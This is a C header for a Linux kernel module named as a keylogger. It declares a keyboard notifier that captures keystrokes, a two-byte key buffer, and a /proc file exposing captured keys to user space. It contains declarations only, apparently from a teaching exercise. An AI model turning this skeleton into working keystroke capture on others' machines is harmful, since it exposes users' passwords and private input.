#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>

/**
 * @file keylogger.h
 * @brief Header file for the keylogger kernel module.
 */

/**
 * @brief Name of the proc file created by the keylogger module.
 */
#define PROCFS_NAME "keylogger"

/**
 * @brief Maximum size of the buffer to store captured keystrokes.
 */
#define MAX_BUFFER_SIZE 2

/**
 * @brief Notifier block for keyboard events.
 */
extern struct notifier_block nb;

/**
 * @brief Buffer to store the latest keystroke captured.
 */
extern char key_buffer[MAX_BUFFER_SIZE];

/**
 * @brief Proc file entry for interfacing with user space.
 */
extern struct proc_dir_entry *proc_file;

/**
 * @brief Spinlock for synchronizing access to the key buffer.
 */
extern spinlock_t lock;

/**
 * @brief Notifier function for handling keyboard events.
 * 
 * This function captures the keystroke data and stores it in the buffer
 * when a key is pressed.
 * 
 * @param nb Pointer to the notifier block.
 * @param action Action code indicating the type of event.
 * @param data Additional data (keyboard notifier parameters).
 * 
 * @return int Returns NOTIFY_OK to indicate successful handling.
 */
int keylogger_notify(struct notifier_block *nb, unsigned long action, void *data);

/**
 * @brief Read function for the proc file.
 * 
 * This function is called when the proc file is read, copying the contents
 * of the key buffer to the user space buffer.
 * 
 * @param file Pointer to the file structure.
 * @param ubuf Pointer to the user space buffer.
 * @param count Number of bytes to read.
 * @param ppos Pointer to the current position in the file.
 * 
 * @return ssize_t Number of bytes read, or an error code.
 */
ssize_t procfile_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos);

/**
 * @brief Initialization function for the keylogger module.
 * 
 * This function registers the keyboard notifier and creates the proc file entry.
 * It is called when the module is loaded into the kernel.
 * 
 * @return int 0 on success, negative error code on failure.
 */
int __init keylogger_init(void);

/**
 * @brief Cleanup function for the keylogger module.
 * 
 * This function removes the proc file entry and unregisters the keyboard notifier.
 * It is called when the module is unloaded from the kernel.
 */
void __exit keylogger_exit(void);

#endif // KEYLOGGER_H
